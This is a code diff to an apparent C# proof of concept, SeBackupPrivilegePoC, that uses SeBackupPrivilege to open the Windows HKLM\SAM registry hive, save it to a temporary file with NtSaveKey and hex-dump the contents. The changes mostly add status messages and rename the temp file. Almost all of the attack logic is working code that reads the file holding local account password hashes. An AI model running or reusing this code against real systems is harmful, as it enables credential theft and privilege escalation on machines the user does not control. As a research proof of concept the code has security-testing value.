@@ -238,11 +238,6 @@ namespace SeBackupPrivilegePoC
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool FreeLibrary(IntPtr hLibModule);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern int GetFileSize(
-            IntPtr hFile,
-            IntPtr lpFileSizeHigh);
-
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
         static extern IntPtr LoadLibrary(string lpFileName);
 
@@ -271,7 +266,7 @@ namespace SeBackupPrivilegePoC
         /*
          * Windows Consts
          */
-        static IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
+        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
         const int STATUS_SUCCESS = 0;
         const uint OBJ_CASE_INSENSITIVE = 0x40;
         const uint KEY_READ = 0X20019;
@@ -360,11 +355,14 @@ namespace SeBackupPrivilegePoC
             int ntstatus;
             byte[] data;
             string filePath = string.Format(
-                @"{0}\tmp_hardware_key.dat",
+                @"{0}\tmp_sam_hive.dat",
                 Environment.CurrentDirectory);
             var objectAttributes = new OBJECT_ATTRIBUTES(
                 @"\Registry\Machine\SAM",
                 OBJ_CASE_INSENSITIVE);
+
+            Console.WriteLine("[>] Trying to create temporary file.");
+            Console.WriteLine("    |-> File Path : {0}", filePath);
 
             IntPtr hFile = CreateFile(
                 filePath,
@@ -378,11 +376,14 @@ namespace SeBackupPrivilegePoC
             if (hFile == INVALID_HANDLE_VALUE)
             {
                 error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to create temp file.");
+                Console.WriteLine("[-] Failed to create temporary file.");
                 Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
 
                 return false;
             }
+
+            Console.WriteLine("[+] The temporary file is created successfully (hFile = 0x{0}).", hFile.ToString("X"));
+            Console.WriteLine("[>] Trying to open HKLM\\SAM.");
 
             ntstatus = NtOpenKey(
                 out IntPtr hKey,
@@ -398,6 +399,9 @@ namespace SeBackupPrivilegePoC
                 return false;
             }
 
+            Console.WriteLine("[+] HKLM\\SAM is opened successfully (hKey = 0x{0}).", hKey.ToString("X"));
+            Console.WriteLine("[>] Trying to save HKLM\\SAM to {0}.", filePath);
+
             ntstatus = NtSaveKey(hKey, hFile);
             NtClose(hKey);
 
@@ -410,13 +414,16 @@ namespace SeBackupPrivilegePoC
                 return false;
             }
 
+            Console.WriteLine("[+] HKLM\\SAM is saved successfully.");
+            Console.WriteLine("[>] Trying to read the saved HKLM\\SAM.");
+
             data = ReadBytesFromFile(hFile, nSize);
             NtClose(hFile);
 
             if (data.Length == 0)
                 return false;
 
-            Console.WriteLine("[*] Dumped HKLM\\SAM (Top {0} bytes):\n", nSize);
+            Console.WriteLine("[+] Dumped HKLM\\SAM (Top {0} bytes):\n", nSize);
             HexDump.Dump(data, 1);
 
             return true;
